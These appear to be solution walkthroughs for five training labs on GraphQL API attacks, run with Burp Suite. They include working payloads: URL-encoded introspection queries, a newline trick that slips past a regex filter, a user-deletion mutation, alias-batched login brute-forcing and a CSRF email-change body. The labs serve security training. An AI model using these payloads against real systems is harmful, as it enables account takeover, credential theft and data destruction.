Lab: Accessing private GraphQL posts

Identify the vulnerability

    In Burp's browser, access the blog page.

    In Burp, go to Proxy > HTTP history and notice the following:
        Blog posts are retrieved using a GraphQL query.
        In the response to the GraphQL query, each blog post has its own sequential id.
        Blog post id 3 is missing from the list. This indicates that there is a hidden blog post.

    Find the POST /graphql/v1 request. Right-click it and select Send to Repeater.

    In Repeater, right-click anywhere in the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.

    Send the request. Notice in the response that the BlogPost type has a postPassword field available.

Exploit the vulnerability to find the password

    In the HTTP history, find the POST /graphql/v1 request. Right-click it and select Send to Repeater.

    In Repeater, click on the GraphQL tab. In the Variables panel, modify the id variable to 3 (the ID of the hidden blog post).

    In the Query panel, add the postPassword field to the query.

    Send the request.

    Copy the contents of the response's postPassword field and paste them into the Submit solution dialog to solve the lab. You may need to refresh the page.

Lab: Accidental exposure of private GraphQL fields



Identify the vulnerability

    In Burp's browser, access the lab and select My account.

    Attempt to log in to the site.

    In Burp, go to Proxy > HTTP history and notice that the login attempt is sent as a GraphQL mutation containing a username and password.

    Right-click the login request and select Send to Repeater.

    In Repeater, right-click anywhere within the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.

    Send the request.

    Right-click the message and select GraphQL > Save GraphQL queries to site map.

    Go to Target > Site map and review the GraphQL queries. Notice the following:
        There is a getUser query that returns a user's username and password.
        This query fetches the relevant user information via a direct reference to an id number.

Modify the query to retrieve the administrator credentials

    Right-click the the getUser query and select Send to Repeater.

    In Repeater, click Send. Notice that the default id value of 0 doesn't return a user.

    Select the GraphQL tab and test alternative values for the id variable until the API returns the administrator's credentials. In this case, the administrator's ID is 1.

    Log in to the site as the administrator, go to the Admin panel, and delete carlos to solve the lab.

Lab: Finding a hidden GraphQL endpoint



Find the hidden GraphQL endpoint

    In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.

    Note that when you send a GET request to /api the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.

    Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.

    For example: /api?query=query{__typename}.

    Notice that the response confirms that this is a GraphQL endpoint:
    {
      "data": {
        "__typename": "query"
      }
    }
                                    

Overcome the introspection defenses

    Send a new request with a URL-encoded introspection query as a query parameter.

    To do this, right-click the request and select GraphQL > Set introspection query:

    /api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
                                    

    Notice from the response that introspection is disallowed.

    Modify the query to include a newline character after __schema and resend.

    For example:

    /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
                                    

    Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{", which the query no longer matches even though it is still a valid introspection query.

Exploit the vulnerability to delete carlos

    Right-click the request and select GraphQL > Save GraphQL queries to site map.

    Go to Target > Site map to see the API queries. Use the GraphQL tab and find the getUser query. Right-click the request and select Send to Repeater.

    In Repeater, send the getUser query to the endpoint you discovered.

    Notice that the response returns:
    {
    "data": {
    "getUser": null
    }
    }

    Click on the GraphQL tab and change the id variable to find carlos's user ID. In this case, the relevant user ID is 3.

    In Target > Site map, browse the schema again and find the deleteOrganizationUser mutation. Notice that this mutation takes a user ID as a parameter.

    Send the request to Repeater.

    In Repeater, send a deleteOrganizationUser mutation with a user ID of 3 to delete carlos and solve the lab.

    For example:

        /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
                                    

Lab: Bypassing GraphQL brute force protections



    In Burp's browser, access the lab and select My account.

    Attempt to log in to the site using incorrect credentials.

    In Burp, go to Proxy > HTTP history. Note that login requests are sent as a GraphQL mutation.

    Right-click the login request and select Send to Repeater.

    In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error.

    In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming.

    Bear the following in mind when constructing your request:
        The list of aliases should be contained within a mutation {} type.
        Each aliased mutation should have the username carlos and a different password from the authentication list.
        If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending. You can do this from Repeater's Pretty tab.
        Ensure that each alias requests the success field, as shown in the simplified example below:

        mutation {
            bruteforce0:login(input:{password: "123456", username: "carlos"}) {
                  token
                  success
              }

              bruteforce1:login(input:{password: "password", username: "carlos"}) {
                  token
                  success
              }

        ...

              bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
                  token
                  success
              }
        }
                                    

    Click Send.

    Notice that the response lists each login attempt and whether its login attempt was successful.

    Use the search bar below the response to search for the string true. This indicates which of the aliased mutations was able to successfully log in as carlos.

    Check the request for the password that was used by the successful alias.

    Log in to the site using the carlos credentials to solve the lab.

Lab: Performing CSRF exploits over GraphQL



    Open Burp's browser, access the lab and log in to your account.

    Enter a new email address, then click Update email.

    In Burp, go to Proxy > HTTP history and check the resulting request. Note that the email change is sent as a GraphQL mutation.

    Right-click the email change request and select Send to Repeater.

    In Repeater, amend the GraphQL query to change the email to a second different address.

    Click Send.

    In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.

    Convert the request into a POST request with a Content-Type of x-www-form-urlencoded. To do this, right-click the request and select Change request method twice.

    Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.

    The body should look like the below:


        query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
                                        

    Right-click the request and select Engagement tools > Generate CSRF PoC. Burp displays the CSRF PoC generator dialog.

    Amend the HTML in the CSRF PoC generator dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.

    Copy the HTML.

    In the lab, click Go to exploit server.

    Paste the HTML into the exploit server and click Deliver exploit to victim to solve the lab.

